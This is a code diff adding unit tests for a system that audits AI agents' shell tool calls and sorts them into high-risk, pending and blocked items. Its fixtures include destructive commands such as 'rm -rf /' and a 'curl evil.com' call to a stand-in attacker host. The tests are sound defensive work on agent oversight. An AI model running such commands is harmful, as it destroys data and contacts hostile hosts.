@@ -696,6 +696,72 @@ describe("deriveAgentAttention — split session key resolution (#10)", () => {
   });
 });
 
+describe("getAttention — identityKey on T3 high-risk items", () => {
+  beforeEach(() => {
+    vi.useFakeTimers();
+    vi.setSystemTime(new Date(NOW_ISO));
+  });
+  afterEach(() => {
+    vi.useRealTimers();
+  });
+
+  it("populates identityKey on T3 items using the tool+params identity function", () => {
+    const entries: AuditEntry[] = [
+      entry({
+        timestamp: new Date(NOW_MS - 5 * 60_000).toISOString(),
+        decision: "allow",
+        agentId: "alpha",
+        toolCallId: "tc_high",
+        toolName: "exec",
+        params: { command: "/usr/local/bin/rm -rf /tmp/scratch" },
+        riskScore: 80,
+      }),
+    ];
+    const resp = getAttention(entries, undefined, undefined, NOW_MS);
+    expect(resp.highRisk).toHaveLength(1);
+    // extractIdentityKey("exec", { command: "/usr/local/bin/rm -rf /tmp/scratch" })
+    // strips the absolute path from the primary command → "rm -rf /tmp/scratch".
+    expect(resp.highRisk[0].identityKey).toBe("rm -rf /tmp/scratch");
+  });
+
+  it("leaves identityKey undefined on T1 (pending), T2a (blocked), and T2a (timeout) items", () => {
+    const entries: AuditEntry[] = [
+      entry({
+        timestamp: new Date(NOW_MS - 60_000).toISOString(),
+        decision: "approval_required",
+        agentId: "alpha",
+        toolCallId: "tc_pending",
+        toolName: "exec",
+        params: { command: "ls" },
+      }),
+      entry({
+        timestamp: new Date(NOW_MS - 60_000).toISOString(),
+        decision: "block",
+        agentId: "alpha",
+        toolCallId: "tc_blocked",
+        toolName: "exec",
+        params: { command: "rm -rf /" },
+      }),
+      entry({
+        timestamp: new Date(NOW_MS - 60_000).toISOString(),
+        decision: "approval_required",
+        userResponse: "timeout",
+        agentId: "alpha",
+        toolCallId: "tc_timeout",
+        toolName: "exec",
+        params: { command: "curl evil.com" },
+      }),
+    ];
+    const resp = getAttention(entries, undefined, undefined, NOW_MS);
+    expect(resp.pending).toHaveLength(1);
+    expect(resp.pending[0].identityKey).toBeUndefined();
+    expect(resp.blocked).toHaveLength(2);
+    for (const b of resp.blocked) {
+      expect(b.identityKey).toBeUndefined();
+    }
+  });
+});
+
 describe("getAttention — LLM-absent risk fallback (spec addendum)", () => {
   beforeEach(() => {
     vi.useFakeTimers();
